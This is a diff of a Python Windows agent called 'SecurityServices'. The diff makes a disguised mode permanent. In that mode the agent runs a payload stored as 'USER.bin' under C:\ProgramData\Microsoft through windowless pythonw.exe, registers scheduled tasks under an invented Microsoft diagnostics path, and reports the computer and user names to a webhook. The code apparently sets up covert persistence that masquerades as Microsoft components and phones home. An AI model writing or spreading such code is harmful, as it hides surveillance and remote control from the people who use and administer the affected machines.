@@ -167,19 +167,10 @@ def kill_process(process_name):
         pass
 
 def create_user_task(username,taskname):
+    INSTALL_DIR = r"C:\ProgramData\Microsoft\JFRE\Diagnosis"
+    USER_DST = os.path.join(INSTALL_DIR, "USER.bin")
     PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
-    APP_NAME = "SecurityServices"
-    INSTALL_DIR = os.path.join(os.environ["ProgramFiles"], APP_NAME)
-    USER_DST = os.path.join(INSTALL_DIR, "user_agent.py")
-
     cmd = f'"{PYTHON_EXE}" "{USER_DST}"'
-    # cmd = f'"{PYTHON_EXE}" "{USER_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsUser{taskname}.txt 2>&1'
-
-    if EXPERIMENTAL:
-        INSTALL_DIR = r"C:\ProgramData\Microsoft\JFRE\Diagnosis"
-        USER_DST = os.path.join(INSTALL_DIR, "USER.bin")
-        PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
-        cmd = f'"{PYTHON_EXE}" "{USER_DST}"'
     
     subprocess.run(
         [
@@ -198,10 +189,7 @@ def create_user_task(username,taskname):
 def create_system_task():
     PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
     APP_NAME = "SecurityServices"
-    if EXPERIMENTAL:
-        SYSTEM_TASK_PATH = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\System"
-    else:
-        SYSTEM_TASK_PATH = "MyApp_SystemAgent"
+    SYSTEM_TASK_PATH = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\System"
 
     INSTALL_DIR = os.path.join(os.environ["ProgramFiles"], APP_NAME)
     SYSTEM_DST = os.path.join(INSTALL_DIR, "system_agent.py")
@@ -267,23 +255,8 @@ def manage_user_tasks():
 
     if user is None:
         return
-    
-    buser = base64.b64encode(user.encode()).decode()
-    if user.endswith("pt_ptsi"):
-        tname = f"MyApp_UserAgent"
-        wrong_tname = f"MyApp_UserAgent{buser}"
-        try:
-            if task_exists(wrong_tname):
-                remove_task(wrong_tname)
-                msg = "removed double task :))"
-                send_webhook(msg)
-        except:
-            pass
-    else:
-        tname = f"MyApp_UserAgent{buser}"
 
-    if EXPERIMENTAL:
-        tname = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\User" + "\\" + sanitize_username(user)
+    tname = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\User" + "\\" + sanitize_username(user)
         
     
     if not task_exists(tname):
@@ -372,9 +345,6 @@ def cleanup_named_tempfiles():
             pass
 
 def manage_updates():
-    if not EXPERIMENTAL:
-        return
-
     folder_list = [
         Path(tempfile.gettempdir()) / "SecurityServices",
         Path(tempfile.gettempdir()) / "tmp",
@@ -489,28 +459,16 @@ if __name__ == "__main__":
     ALIVE_DATA = json.dumps({'info':'alive','script':'system','computer':COMPUTER_NAME,'username':USER_NAME})
 
     FIRST_MESSAGE = True
-    
-    # exp = Path(tempfile.gettempdir()) / "E"
-    # EXPERIMENTAL = (exp.is_file())
 
-    # if EXPERIMENTAL :
-        # send_webhook("Experimental client started")
-
-    EXPERIMENTAL = True
-    # EXPERIMENTAL = COMPUTER_NAME.startswith("B103")
-    # if "P01" in COMPUTER_NAME:
-    #     EXPERIMENTAL = False
-
-    if EXPERIMENTAL:
-        install_ext()
+    install_ext()
     
     loop_function_list = [
-        {
-            "func": manage_updates,
-            "args": [],
-            "interval": 60,  # seconds
-            "next_run": time.monotonic(),
-        },
+        # {
+        #     "func": manage_updates,
+        #     "args": [],
+        #     "interval": 60,  # seconds
+        #     "next_run": time.monotonic(),
+        # },
                 {
             "func": cleanup_named_tempfiles,
             "args": [],
